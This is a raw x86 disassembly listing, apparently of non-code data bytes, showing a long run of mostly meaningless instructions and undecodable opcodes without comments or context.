  41ddf6:	pop    ebx
  41ddf7:	xor    bh,BYTE PTR ds:0x25e5769b
  41ddfd:	jmp    0x41de46
  41ddff:	mov    DWORD PTR [edi-0x42],ecx
  41de02:	add    DWORD PTR [edi],esi
  41de04:	jl     0x41de1f
  41de06:	fwait
  41de07:	std    
  41de08:	mov    ss,edi
  41de0a:	loop   0x41de41
  41de0c:	mov    ah,0x84
  41de0e:	and    BYTE PTR [eax-0x26],0x29
  41de12:	mov    ?,WORD PTR [ebp+0x2c]
  41de15:	inc    esp
  41de16:	or     ecx,DWORD PTR [ebp+0x6efc9c5]
  41de1c:	jmp    0xf144:0xc18fbc77
  41de23:	hlt    
  41de24:	data16 fldcw WORD PTR [esi+0x61e9b682]
  41de2b:	shl    dl,0x7c
  41de2e:	(bad)  [ecx+0x4a4ca320]
  41de34:	cmp    BYTE PTR [edx],cl
  41de36:	cmc    
  41de37:	push   ds
  41de38:	clc    
  41de39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de3a:	sub    dh,BYTE PTR [ebx]
  41de3c:	inc    ebx
  41de3d:	ret    0xd670
  41de40:	adc    DWORD PTR [ebx-0x36],ebp
  41de43:	dec    ebp
  41de44:	pop    edx
  41de45:	jecxz  0x41dea4
  41de47:	and    DWORD PTR [edx+0x16cce63f],esi
  41de4d:	inc    edx
  41de4e:	xor    BYTE PTR ds:0x7449b860,0x95
  41de55:	out    dx,eax
  41de56:	ficom  WORD PTR [edi*1+0x1597f254]
  41de5d:	test   eax,0x2a48d975
  41de62:	test   BYTE PTR [ebx],al
  41de64:	xor    al,0x32
  41de66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de67:	into   
  41de68:	lock mov ebx,edx
  41de6b:	jmp    edx
  41de6d:	into   
  41de6e:	adc    DWORD PTR [ecx],edx
	...
  41de78:	add    BYTE PTR [eax],al
  41de7a:	add    cl,ch
  41de7c:	mov    ecx,0xf37a307a
  41de81:	jmp    0x41de7c
  41de83:	fimul  DWORD PTR [esp+eax*2+0x6c]
  41de87:	inc    eax
  41de88:	int3   
  41de89:	pushf  
  41de8a:	push   eax
  41de8b:	test   eax,0xad00019c
  41de90:	add    BYTE PTR [eax],al
  41de92:	add    BYTE PTR [esi+eiz*1],bh
  41de95:	sub    al,0xb5
  41de97:	das    
  41de98:	pop    ecx
  41de99:	fst    DWORD PTR [ebp+0x7a958388]
  41de9f:	jnp    0x41deaa
  41dea1:	pop    esp
  41dea2:	inc    eax
  41dea3:	popf   
  41dea4:	fadd   DWORD PTR [edi-0x1a]
  41dea7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dea8:	sub    DWORD PTR [ecx],edi
  41deaa:	outs   dx,DWORD PTR ds:[esi]
  41deab:	xchg   edi,eax
  41deac:	mov    ds:0xe6ead6d8,eax
  41deb1:	(bad)  
  41deb2:	fsub   st(6),st
  41deb4:	gs or  al,0x85
  41deb7:	push   edx
  41deb8:	shl    DWORD PTR [ecx],cl
  41deba:	sar    BYTE PTR [ecx],cl
  41debc:	adc    eax,0xb21a0f21
  41dec1:	outs   dx,DWORD PTR ds:[esi]
  41dec2:	loop   0x41de57
  41dec4:	cmp    BYTE PTR [ecx],0x2e
  41dec7:	sar    edi,0x72
  41deca:	shl    ch,1
  41decc:	mov    dl,dh
  41dece:	bound  ebp,QWORD PTR [edi+edi*8]
  41ded1:	les    esp,FWORD PTR [ecx+0x4c98c01e]
  41ded7:	sub    DWORD PTR [edi-0x531393ac],eax
  41dedd:	aad    0xbb
  41dedf:	sar    DWORD PTR [edi+0x463e784a],1
  41dee5:	fiadd  DWORD PTR [edi]
  41dee7:	jmp    0x3cf16359
  41deec:	fst    QWORD PTR [ebx]
  41deee:	dec    esp
  41deef:	mov    edx,0x5387c1c7
  41def4:	ds mov dh,0xd8
  41def7:	iret   
  41def8:	and    ch,BYTE PTR [ebp-0xf2bbef0]
  41defe:	inc    ebx
  41deff:	pop    edi
  41df00:	xor    al,0x91
  41df02:	pop    esp
  41df03:	lahf   
  41df04:	scas   eax,DWORD PTR es:[edi]
  41df05:	cwde   
  41df06:	dec    edi
  41df07:	sub    dl,BYTE PTR [ebx]
  41df09:	call   FWORD PTR [eax+0x7e1cb474]
  41df0f:	or     cl,BYTE PTR [ebx]
  41df11:	loope  0x41df1f
  41df13:	xor    dl,BYTE PTR [edi-0x1e]
  41df16:	jo     0x41df04
  41df18:	in     eax,dx
  41df19:	loop   0x41df92
  41df1b:	xchg   edi,eax
  41df1c:	jecxz  0x41df9c
  41df1e:	inc    ecx
  41df1f:	adc    al,0x58
  41df21:	or     ecx,DWORD PTR [ecx]
  41df23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df24:	loope  0x41deaf
  41df26:	and    al,0xf4
  41df28:	ds jnp 0x41df94
  41df2b:	jbe    0x41df1f
  41df2d:	fldenv [ebx]
  41df2f:	push   ss
  41df30:	sub    dh,BYTE PTR [eax]
  41df32:	lahf   
  41df33:	fwait
  41df34:	pop    eax
  41df35:	outs   dx,DWORD PTR ds:[esi]
  41df36:	ret    0xad38
  41df39:	mov    edi,0x6ce33f1a
  41df3e:	mov    dl,0xda
	...
  41df48:	add    BYTE PTR [eax],al
  41df4a:	add    BYTE PTR [ebx+0x41],bl
  41df4d:	pop    ebx
  41df4e:	iret   
  41df4f:	pop    ebx
  41df50:	(bad)  
  41df52:	aad    0xf
  41df54:	ss dec esp
  41df56:	dec    esi
  41df57:	push   eax
  41df58:	(bad)  
  41df59:	mov    ecx,0x19d5637
  41df5e:	add    BYTE PTR [ebp+0x6e000000],ch
  41df64:	xchg   esi,eax
  41df65:	jns    0x41dfd6
  41df67:	jl     0x41def6
  41df69:	xchg   ecx,eax
  41df6a:	test   dl,0xb6
  41df6d:	pop    edi
  41df6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df6f:	shl    DWORD PTR [ecx+0x3ad2f03a],1
  41df75:	in     al,dx
  41df76:	or     ebx,edi
  41df78:	and    al,0xcd
  41df7a:	adc    BYTE PTR [eax-0x43],ch
  41df7d:	loop   0x41dfa4
  41df7f:	dec    esp
  41df80:	addr16 pusha 
  41df82:	lods   al,BYTE PTR ds:[esi]
  41df83:	add    edx,ebx
  41df85:	(bad)  
  41df86:	mov    ecx,0xf27f245f
  41df8b:	push   ds
  41df8c:	fcmovbe st,st(2)
  41df8e:	add    esi,DWORD PTR ds:0x46568804
  41df94:	add    eax,0x4f437cdd
  41df99:	nop
  41df9a:	adc    al,0xaf
  41df9c:	icebp  
  41df9d:	hlt    
  41df9e:	adc    eax,0xe786979c
  41dfa3:	mov    al,0x6a
  41dfa5:	scas   al,BYTE PTR es:[edi]
  41dfa6:	xor    al,0x27
  41dfa8:	push   ebx
  41dfa9:	xchg   ebp,eax
  41dfaa:	mov    eax,0x2d6411ab
  41dfaf:	or     eax,0x8efb8526
  41dfb4:	push   edx
  41dfb5:	(bad)  
  41dfb6:	mov    eax,ds:0x90f6ffee
  41dfbb:	aad    0x96
  41dfbd:	xor    BYTE PTR [edi],cl
  41dfbf:	xchg   BYTE PTR [edi-0x42afa80],ch
  41dfc5:	shl    bl,1
  41dfc7:	mov    ds:0x603f3a7c,al
  41dfcc:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  41dfce:	cmp    BYTE PTR [edi+0x4422ff52],cl
  41dfd4:	dec    esp
  41dfd5:	mov    eax,ds:0x5b55f625
  41dfda:	push   ds
  41dfdb:	xlat   BYTE PTR ds:[ebx]
  41dfdc:	pop    es
  41dfdd:	into   
  41dfde:	xor    esp,ecx
  41dfe0:	out    0x27,eax
  41dfe2:	imul   edx,DWORD PTR [ebx],0x11
  41dfe5:	sbb    eax,0x26b30819
  41dfea:	stc    
  41dfeb:	cld    
  41dfec:	enter  0xf27b,0xa
  41dff0:	(bad)  
  41dff1:	pop    ss
  41dff2:	jb     0x41df9b
  41dff4:	out    0x1a,al
  41dff6:	pop    ss
  41dff7:	mov    al,ds:0x3942f5d0
  41dffc:	dec    edx
  41dffd:	pop    es
  41dffe:	sar    BYTE PTR [edx+0x2881987f],1
  41e004:	popa   
  41e005:	mov    bl,0xa3
  41e007:	aam    0x3d
  41e009:	push   edi
  41e00a:	jmp    0xcd:0xdd67bba3
	...
  41e019:	add    BYTE PTR [eax],al
  41e01b:	fwait
  41e01c:	test   DWORD PTR [ebp+0x3c],esp
  41e01f:	jg     0x41e01d
  41e021:	(bad)  [edi-0x65be08a1]
  41e027:	sbb    dh,BYTE PTR [ebx]
  41e029:	or     DWORD PTR [ebx+eax*1],edx
  41e02c:	sahf   
  41e02d:	add    DWORD PTR [eax],eax
  41e02f:	lods   eax,DWORD PTR ds:[esi]
  41e030:	add    BYTE PTR [eax],al
  41e032:	add    BYTE PTR [ebx+ebp*1+0x425a046a],bh
  41e039:	fidiv  WORD PTR [edx*8+0x26e0c50b]
  41e040:	mov    al,0x2b
  41e042:	std    
  41e043:	(bad)  
  41e045:	cli    
  41e046:	out    0xd5,eax
  41e048:	push   edi
  41e049:	call   0xddf2252b
  41e04e:	scas   al,BYTE PTR es:[edi]
  41e04f:	cmp    BYTE PTR [ecx],cl
  41e051:	sbb    al,0x5d
  41e053:	mov    eax,0x2f013fe7
  41e058:	mov    ch,0x0
  41e05a:	shl    DWORD PTR [eax+0x2a],0xca
  41e05e:	push   eax
  41e05f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e060:	mov    esi,0x73c27e1a
  41e065:	jmp    0xe97a4a2
  41e06a:	push   edx
  41e06b:	push   cs
  41e06c:	push   esp
  41e06d:	fist   DWORD PTR [esi-0x367f217f]
  41e073:	mov    edx,?
  41e075:	stc    
  41e076:	push   eax
  41e077:	test   DWORD PTR [edi+esi*1+0x47],0xe9ab90c6
  41e07f:	jo     0x41e06c
  41e081:	push   0x3
  41e083:	xchg   edi,eax
  41e084:	sbb    ebx,DWORD PTR [ecx+0x10]
  41e087:	dec    esi
  41e088:	xor    edi,ebx
  41e08a:	xor    eax,0x7894fac8
  41e08f:	(bad)  
  41e091:	rcr    DWORD PTR [eax+ebp*2+0x2fe5e491],1
  41e098:	in     eax,dx
  41e099:	mov    bh,0x7d
  41e09b:	add    eax,0xf05e81a2
  41e0a0:	fistp  WORD PTR [edi+0x5e]
  41e0a3:	jmp    0x2080:0x917be104
  41e0aa:	cmp    eax,0x49efcf3e
  41e0af:	xor    BYTE PTR [edi+0x5e],ch
  41e0b2:	sub    DWORD PTR [edi-0x1aeb92a7],0xa
  41e0b9:	mov    al,0x63
  41e0bb:	cmp    al,bl
  41e0bd:	outs   dx,BYTE PTR ds:[esi]
  41e0be:	sub    dl,BYTE PTR [ebx]
  41e0c0:	adc    ah,BYTE PTR [ecx]
  41e0c2:	push   ecx
  41e0c3:	lods   eax,DWORD PTR ds:[esi]
  41e0c4:	mov    esp,fs
  41e0c6:	out    0xa0,eax
  41e0c8:	adc    bh,ch
  41e0ca:	fisttp QWORD PTR [esi+0x3c]
  41e0cd:	pop    esp
  41e0ce:	cmp    eax,0xd63a685c
  41e0d3:	cmc    
  41e0d4:	adc    eax,0xffffff85
  41e0d7:	fidivr DWORD PTR [ecx-0x45e5d162]
  41e0dd:	jmp    0x0:0xff42
  41e0e4:	add    BYTE PTR [eax],al
  41e0e6:	add    BYTE PTR [eax],al
  41e0e8:	add    BYTE PTR [eax],al
  41e0ea:	add    BYTE PTR [esi+0x73],ch
  41e0ed:	lock retf 0xcbfd
  41e0f1:	jle    0x41e0ea
  41e0f3:	repz xor eax,0xeedd8ce9
  41e0f9:	dec    eax
  41e0fa:	adc    al,0xb0
  41e0fc:	sahf   
  41e0fd:	add    DWORD PTR [eax],eax
  41e0ff:	lods   eax,DWORD PTR ds:[esi]
  41e100:	add    BYTE PTR [eax],al
  41e102:	add    BYTE PTR [ecx-0x13],al
  41e105:	jnp    0x41e0cd
  41e107:	(bad)  [esi-0x41]
  41e10a:	fnstsw WORD PTR [eax-0x73]
  41e10d:	jbe    0x41e137
  41e10f:	jns    0x41e119
  41e111:	xchg   edi,eax
  41e112:	add    eax,0x664678f8
  41e117:	push   esi
  41e118:	xor    bl,dh
  41e11a:	pop    esi
  41e11b:	cdq    
  41e11c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e11d:	push   es
  41e11e:	shr    BYTE PTR ds:0x644ae911,1
  41e124:	fild   DWORD PTR [esi+0xa]
  41e127:	mov    edi,0xd24e2131
  41e12c:	cmp    cl,BYTE PTR [edi-0x52]
  41e12f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e130:	sub    ecx,edx
  41e132:	nop
  41e133:	popa   
  41e134:	and    edx,ebp
  41e136:	xor    BYTE PTR [edx+0x1b],bh
  41e139:	jge    0x41e163
  41e13b:	es dec edi
  41e13d:	inc    eax
  41e13e:	cmp    dl,BYTE PTR [edi+0x71388540]
  41e144:	add    DWORD PTR [ebp+0x60],esp
  41e147:	push   sp
  41e149:	jbe    0x41e0f5
  41e14b:	retf   
  41e14c:	add    BYTE PTR ds:0x5e229fa3,0x5f
  41e153:	bnd ret 
  41e155:	add    BYTE PTR [ebx-0x18],0xd2
  41e159:	out    0x17,eax
  41e15b:	(bad)  
  41e15c:	pusha  
  41e15d:	in     al,0xad
  41e15f:	xor    BYTE PTR [esi+0x5eaeb3d7],bl
  41e165:	dec    ecx
  41e166:	or     eax,0x4cc01381
  41e16b:	mov    cl,0x70
  41e16d:	je     0x41e19c
  41e16f:	xor    al,0x72
  41e171:	out    dx,al
  41e172:	js     0x41e166
  41e174:	jecxz  0x41e18b
  41e176:	cmp    eax,0x786248f5
  41e17b:	inc    eax
  41e17c:	lahf   
  41e17d:	outs   dx,BYTE PTR ds:[esi]
  41e17e:	xlat   BYTE PTR ds:[ebx]
  41e17f:	cli    
  41e180:	cmp    ch,0xdf
  41e183:	mov    ebp,0xa4e73a0
  41e188:	inc    ecx
  41e189:	push   ebp
  41e18a:	jae    0x41e12e
  41e18c:	or     bl,BYTE PTR [edi]
  41e18e:	push   edx
  41e18f:	push   ecx
  41e190:	and    BYTE PTR [ebx-0x3aaf93c2],ah
  41e196:	xchg   edi,eax
  41e197:	sahf   
  41e198:	mov    eax,ds:0x3a58a56d
  41e19d:	push   0x1864b4f3
  41e1a2:	adc    al,BYTE PTR [ebx+edi*2]
  41e1a5:	push   cs
  41e1a6:	mov    dl,0x46
  41e1a8:	dec    eax
  41e1a9:	dec    edx
  41e1aa:	push   ebp
  41e1ab:	pop    ebx
  41e1ac:	pusha  
  41e1ad:	push   esi
  41e1ae:	inc    ebp
  41e1af:	inc    eax
	...
  41e1b8:	add    BYTE PTR [eax],al
  41e1ba:	add    ch,dh
  41e1bc:	adc    al,0xae
  41e1be:	adc    ebp,edi
  41e1c0:	mov    ebx,0x84e6f6fd
  41e1c5:	lds    ebp,FWORD PTR [edx-0x7ded8b52]
  41e1cb:	pop    ebp
  41e1cc:	lahf   
  41e1cd:	add    DWORD PTR [eax],eax
  41e1cf:	lods   eax,DWORD PTR ds:[esi]
  41e1d0:	add    BYTE PTR [eax],al
  41e1d2:	add    BYTE PTR [esi+ebx*4-0x76],al
  41e1d6:	neg    DWORD PTR [eax]
  41e1d8:	mov    dh,0xbf
  41e1da:	in     al,dx
  41e1db:	pusha  
  41e1dc:	mov    esi,0x426fa230
  41e1e1:	test   BYTE PTR [ebx-0x58204c0d],bh
  41e1e7:	add    al,bh
  41e1e9:	stc    
  41e1ea:	int3   
  41e1eb:	in     eax,dx
  41e1ec:	jnp    0x41e1fb
  41e1ee:	push   ss
  41e1ef:	xchg   esi,eax
  41e1f0:	mov    ds:0x4c8e11b1,al
  41e1f5:	jge    0x41e1b5
  41e1f7:	mov    ebp,0x2ef2926d
  41e1fc:	mov    esp,0xde79a3cb
  41e201:	adc    eax,0x80948b3e
  41e206:	mov    edi,0xc081eeac
  41e20b:	xor    ch,0xc4
  41e20e:	outs   dx,BYTE PTR ds:[esi]
  41e20f:	push   esi
  41e210:	or     DWORD PTR [esi+0x5a787463],0x2d
  41e217:	jge    0x41e19b
  41e219:	hlt    
  41e21a:	xor    dl,ah
  41e21c:	xlat   BYTE PTR ds:[ebx]
  41e21d:	add    cl,BYTE PTR [edx+0x8bc2b9f]
  41e223:	add    BYTE PTR [ecx-0x74],bh
  41e226:	or     al,0xc
  41e228:	mov    edi,0x8e234c4c
  41e22d:	jge    0x41e22e
  41e22f:	sbb    BYTE PTR [ecx],0x3f
  41e232:	cmp    esp,DWORD PTR [edi+eax*8]
  41e235:	scas   eax,DWORD PTR es:[edi]
  41e236:	or     BYTE PTR [edx],dh
  41e238:	das    
  41e239:	je     0x41e268
  41e23b:	lds    ecx,FWORD PTR [eax]
  41e23d:	fimul  WORD PTR ds:[ecx+esi*2+0x62]
  41e242:	das    
  41e243:	popa   
  41e244:	imul   ecx,DWORD PTR [ecx+ebp*2],0x54
  41e248:	xchg   ebp,eax
  41e249:	loope  0x41e267
  41e24b:	jae    0x41e273
  41e24d:	and    al,0xdc
  41e24f:	aam    0x67
  41e251:	div    dh
  41e253:	cmp    esi,DWORD PTR [esi+0x25]
  41e256:	jns    0x41e29b
  41e258:	pop    ebp
  41e259:	and    eax,0x63059f69
  41e25e:	jmp    0x4d2c6f31
  41e263:	mov    DWORD PTR [esi+0x201d929d],edx
  41e269:	push   edi
  41e26a:	scas   eax,DWORD PTR es:[edi]
  41e26b:	mov    edi,0x29bb15d
  41e270:	adc    al,0xa3
  41e272:	dec    ecx
  41e273:	xor    al,0x8d
  41e275:	rol    eax,0xb3
  41e278:	mov    al,0x8d
  41e27a:	adc    BYTE PTR [edx+0x7e862040],al
	...
  41e288:	add    BYTE PTR [eax],al
  41e28a:	add    BYTE PTR [ebx],bh
  41e28c:	mov    cl,0x57
  41e28e:	lock fcomip st,st(6)
  41e291:	mov    edi,0xbb1c16fb
  41e296:	ror    ah,0xda
  41e299:	and    eax,0x1a00a48
  41e29e:	add    BYTE PTR [ebp+0x15000000],ch
  41e2a4:	or     eax,0x990b2843
  41e2a9:	sub    ah,BYTE PTR [ebp+0x2e266d51]
  41e2af:	cmp    edx,DWORD PTR fs:[edx]
  41e2b2:	sbb    BYTE PTR [esi],0xf5
  41e2b5:	int3   
  41e2b6:	and    BYTE PTR [ebx+0x37cf5031],ch
  41e2bc:	mov    ds:0x83a8a67f,eax
  41e2c1:	into   
  41e2c2:	add    al,0x5a
  41e2c4:	xchg   ebp,eax
  41e2c5:	sbb    edi,DWORD PTR [ecx+0x16bc9f0b]
  41e2cb:	push   ecx
  41e2cc:	lahf   
  41e2cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e2ce:	mov    ebx,0x16a91e6a
  41e2d3:	hlt    
  41e2d4:	add    BYTE PTR [ebx+0x6502226e],dl
  41e2da:	inc    ecx
  41e2db:	popa   
  41e2dc:	push   ebp
  41e2dd:	rcl    BYTE PTR [esi-0x4e],cl
  41e2e0:	idiv   ch
  41e2e2:	pushf  
  41e2e3:	iret   
  41e2e4:	sub    dl,BYTE PTR [ebp+0xd]
  41e2e7:	sbb    edx,DWORD PTR [ecx-0x6c]
  41e2ea:	fidivr DWORD PTR ds:0xe4bb4618
  41e2f0:	mov    ebp,0xcc327cb4
  41e2f5:	psrld  mm3,mm3
  41e2f8:	pop    ss
  41e2f9:	jb     0x41e2da
  41e2fb:	out    0xe0,al
  41e2fd:	xchg   esi,eax
  41e2fe:	and    eax,0x3d1d2400
  41e303:	bound  edx,QWORD PTR [edx+ecx*1]
  41e306:	sub    DWORD PTR [eax-0x4608a31e],0xffffffc3
  41e30d:	adc    al,0xd1
  41e30f:	push   0xffffffdc
  41e311:	mov    cl,0xb9
  41e313:	sub    BYTE PTR [edx+0x4f75ffac],ah
  41e319:	mul    esi
  41e31b:	retw   
  41e31d:	mov    al,ds:0xefc92b0b
  41e322:	lods   eax,DWORD PTR ds:[esi]
  41e323:	aad    0x98
  41e325:	cld    
  41e326:	jge    0x41e347
  41e328:	sub    eax,0x2524c6d7
  41e32d:	or     eax,0x1a2bc123
  41e332:	xor    edi,eax
  41e334:	enter  0xca5c,0x7c
  41e338:	inc    eax
  41e339:	push   cs
  41e33a:	cmp    cl,BYTE PTR [esi+0x72]
  41e33d:	add    bl,BYTE PTR [edi-0x161f160d]
  41e343:	fs jle 0x41e36d
  41e346:	scas   al,BYTE PTR es:[edi]
  41e347:	ds cmp eax,0x4838f21d
  41e34d:	mov    edx,0x1fa
	...
  41e35a:	add    ah,dl
  41e35c:	sqrtps xmm6,xmm0
  41e35f:	(bad)  
  41e361:	cmc    
  41e362:	das    
  41e363:	sbb    BYTE PTR [eax],cl
  41e365:	xchg   ebx,eax
  41e366:	iret   
  41e367:	mul    bl
  41e369:	cdq    
  41e36a:	ret    0xa0b7
  41e36d:	add    DWORD PTR [eax],eax
  41e36f:	lods   eax,DWORD PTR ds:[esi]
  41e370:	add    BYTE PTR [eax],al
  41e372:	add    BYTE PTR [ebx+eiz*8],ch
  41e375:	fidiv  DWORD PTR [edx-0x1cb86221]
  41e37b:	inc    esi
  41e37c:	xchg   edi,eax
  41e37d:	retf   0x4c68
  41e380:	daa    
  41e381:	pop    ebp
  41e382:	in     eax,dx
  41e383:	adc    BYTE PTR ds:0xccfc7f7f,al
  41e389:	imul   esp,esi,0x8272f204
  41e38f:	mov    eax,ds:0xef428f7c
  41e394:	pop    es
  41e395:	mov    bh,0xe0
  41e397:	add    esi,DWORD PTR [ecx-0x1471ea7b]
  41e39d:	mov    ecx,DWORD PTR [eax-0x720cb273]
  41e3a3:	inc    esp
  41e3a4:	repz inc esp
  41e3a6:	xlat   BYTE PTR ds:[ebx]
  41e3a7:	mov    ds:0x4a21bbea,al
  41e3ac:	inc    ecx
  41e3ad:	jmp    0x3bb4:0x99b0806a
  41e3b4:	sbb    BYTE PTR ds:0xa10ddf6c,bl
  41e3ba:	out    dx,al
  41e3bb:	dec    esi
  41e3bc:	cmp    BYTE PTR [eax+ebp*4+0x6],ch
  41e3c0:	and    BYTE PTR [esp-0x34cfeeac],bl
  41e3c7:	sar    BYTE PTR [esi-0x2b9fc4b2],1
  41e3cd:	jmp    0x7abe8b8c
  41e3d2:	pop    ebp
  41e3d3:	add    ebx,ebx
  41e3d5:	jmp    0xc73b:0x22eb201f
  41e3dc:	shl    BYTE PTR [edx+0x3261d811],0x25
  41e3e3:	fwait
  41e3e4:	loop   0x41e433
  41e3e6:	or     WORD PTR [ecx],0xb4b7
  41e3eb:	inc    esp
  41e3ec:	nop
  41e3ed:	lock scas al,BYTE PTR es:[edi]
  41e3ef:	les    esi,FWORD PTR [ebx+0x28]
  41e3f2:	test   eax,0x5a042d2a
  41e3f7:	xchg   esp,eax
  41e3f8:	inc    eax
  41e3f9:	xchg   esp,ecx
  41e3fb:	sbb    al,BYTE PTR [ecx+0x2f]
  41e3fe:	(bad)  
  41e400:	mov    cl,dh
  41e402:	je     0x41e3b6
  41e404:	sub    eax,0xb3e6671e
  41e409:	out    0xdc,al
  41e40b:	push   edx
  41e40c:	out    dx,eax
  41e40d:	std    
  41e40e:	sub    al,0x8c
  41e410:	jno    0x41e486
  41e412:	in     eax,0x12
  41e414:	mov    esp,DWORD PTR [ecx]
  41e416:	jp     0x41e3be
  41e418:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e419:	inc    ebx
  41e41a:	or     al,0x65
  41e41c:	jns    0x41e432
  41e41e:	add    esi,DWORD PTR [ebp+0x0]
	...
  41e429:	add    BYTE PTR [eax],al
  41e42b:	int    0x2d
  41e42d:	xchg   ebp,eax
  41e42e:	inc    ebx
  41e42f:	cmc    
  41e430:	sti    
  41e431:	fild   QWORD PTR [edi-0x5bdf5fa9]
  41e437:	mov    ebx,0x64a4b4f0
  41e43c:	mov    eax,ds:0xad0001
  41e441:	add    BYTE PTR [eax],al
  41e443:	sbb    al,0x44
  41e445:	(bad)  
  41e446:	imul   ebx,DWORD PTR [ecx],0xffffff8a
  41e449:	sbb    edi,DWORD PTR [esi+0x76]
  41e44c:	cmp    DWORD PTR [ebp+0x53],ecx
  41e44f:	xchg   DWORD PTR [eax],esp
  41e451:	xchg   ebp,eax
  41e452:	mov    cl,dl
  41e454:	add    al,0xe2
  41e456:	jns    0x41e473
  41e458:	idiv   BYTE PTR [edx+0x28f9a4be]
  41e45e:	cs push esp
  41e460:	jle    0x41e457
  41e462:	bound  esp,QWORD PTR cs:[esp+ecx*8]
  41e466:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e467:	jge    0x41e4a7
  41e469:	aam    0xcf
  41e46b:	add    esi,DWORD PTR [ebx+eiz*1+0x52]
  41e46f:	pop    ds
  41e470:	int3   
  41e471:	jge    0x41e41d
  41e473:	xchg   DWORD PTR [ebx-0xf],eax
  41e476:	dec    eax
  41e477:	call   0x3688:0x12e70e54
  41e47e:	cvtpi2ps xmm4,QWORD PTR [ebp-0x46d771a8]
  41e485:	sbb    bl,BYTE PTR [edx]
  41e487:	std    
  41e488:	and    DWORD PTR ds:0xf7d0c3c4,edx
  41e48e:	popf   
  41e48f:	mov    ss,WORD PTR [ecx+0x7a60e09d]
  41e495:	bound  edi,QWORD PTR [eax+ebx*8+0xdb357cc]
  41e49c:	test   BYTE PTR [edi-0x4145c890],dl
  41e4a2:	sahf   
  41e4a3:	inc    ebp
  41e4a4:	adc    al,0xa8
  41e4a6:	enter  0xea94,0x35
  41e4aa:	iret   
  41e4ab:	inc    ebx
  41e4ac:	dec    edi
  41e4ad:	xlat   BYTE PTR ds:[ebx]
  41e4ae:	mov    esp,0x59040210
  41e4b3:	call   0xc9466443
  41e4b8:	cmp    esp,eax
  41e4ba:	mov    dh,0xd0
  41e4bc:	inc    ecx
  41e4bd:	mov    eax,0xddd4a932
  41e4c2:	ins    BYTE PTR es:[edi],dx
  41e4c3:	add    DWORD PTR [ebx-0x76],0xfffffffe
  41e4c7:	pop    esp
  41e4c8:	ja     0x41e4f4
  41e4ca:	jge    0x41e4c1
  41e4cc:	dec    ebp
  41e4cd:	(bad)  
  41e4ce:	sar    BYTE PTR [edx],cl
  41e4d0:	and    al,BYTE PTR [edx-0x764c88f1]
  41e4d6:	in     eax,0xe7
  41e4d8:	ror    DWORD PTR [esi+0x7c],1
  41e4db:	or     DWORD PTR [eax+0x5f],edx
  41e4de:	out    dx,eax
  41e4df:	adc    eax,0xa1094ae4
  41e4e4:	js     0x41e4dd
  41e4e6:	ret    0x3f9b
  41e4e9:	popa   
  41e4ea:	dec    esp
  41e4eb:	ins    DWORD PTR es:[edi],dx
  41e4ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e4ed:	mov    eax,ds:0x39a9
	...
  41e4fa:	add    BYTE PTR [ebx],dl
  41e4fc:	fs out 0xb,eax
  41e4ff:	test   DWORD PTR [ebx-0xce58301],0xcd874cfc
  41e509:	adc    al,dl
  41e50b:	adc    DWORD PTR [edx+0xad0001],esp
  41e511:	add    BYTE PTR [eax],al
  41e513:	rol    DWORD PTR [ebp-0x23786d17],1
  41e519:	pop    edi
  41e51a:	jnp    0x41e559
  41e51c:	cdq    
  41e51d:	mov    ecx,0xa75d9b13
  41e522:	jb     0x41e527
  41e524:	js     0x41e4e2
  41e526:	or     DWORD PTR [edx],0x9ff75b9d
  41e52c:	stos   DWORD PTR es:[edi],eax
  41e52d:	xor    BYTE PTR [ebp-0x1cfedd00],al
  41e533:	fdiv   DWORD PTR ds:0x6eb20e64
  41e539:	adc    bl,BYTE PTR [eax+0x6eb0b82d]
  41e53f:	std    
  41e540:	mov    DWORD PTR [ebx],ebp
  41e542:	dec    esp
  41e543:	inc    edx
  41e544:	(bad)  
  41e545:	fiadd  WORD PTR [ecx+0x76]
  41e548:	in     al,0xeb
  41e54a:	xchg   DWORD PTR [edx],esp
  41e54c:	dec    eax
  41e54d:	jmp    0xb7934e01
  41e552:	inc    ebp
  41e553:	stc    
  41e554:	stos   BYTE PTR es:[edi],al
  41e555:	je     0x41e503
  41e557:	(bad)  
  41e558:	adc    al,0x2a
  41e55a:	shl    BYTE PTR [esi+0x55],1
  41e55d:	test   DWORD PTR [ebp+0xbe909fc],esi
  41e563:	xchg   BYTE PTR [edx],bl
  41e565:	pop    ss
  41e566:	clc    
  41e567:	pop    eax
  41e568:	sub    edx,eax
  41e56a:	push   esp
  41e56b:	scas   al,BYTE PTR es:[edi]
  41e56c:	jns    0x41e5ce
  41e56e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e56f:	out    dx,eax
  41e570:	sub    ah,BYTE PTR [ebp-0x529d0480]
  41e576:	dec    esi
  41e577:	push   0x126df95d
  41e57c:	pop    eax
  41e57d:	scas   eax,DWORD PTR es:[edi]
  41e57e:	push   es
  41e57f:	jb     0xdd1c53cd
  41e585:	jle    0x41e5e6
  41e587:	xor    eax,0x2f5f8b14
  41e58c:	addr16 mov eax,0xf7de2b34
  41e592:	jg     0x41e564
  41e594:	xchg   ebp,eax
  41e595:	jne    0x41e56a
  41e597:	cs xchg edx,eax
  41e599:	pop    es
  41e59a:	sub    ebx,DWORD PTR [edx+0x67fc5dad]
  41e5a0:	jmp    0x9f170117
  41e5a5:	into   
  41e5a6:	push   ds
  41e5a7:	xchg   DWORD PTR [edi-0x4b],ebx
  41e5aa:	in     eax,dx
  41e5ab:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  41e5ad:	mov    ebp,esp
  41e5af:	ja     0x41e613
  41e5b1:	cld    
  41e5b2:	out    dx,eax
  41e5b3:	test   DWORD PTR [ebp+0x274c04b9],edi
  41e5b9:	xor    ch,ch
  41e5bb:	sub    DWORD PTR [ebx+0x272e3],ecx
	...
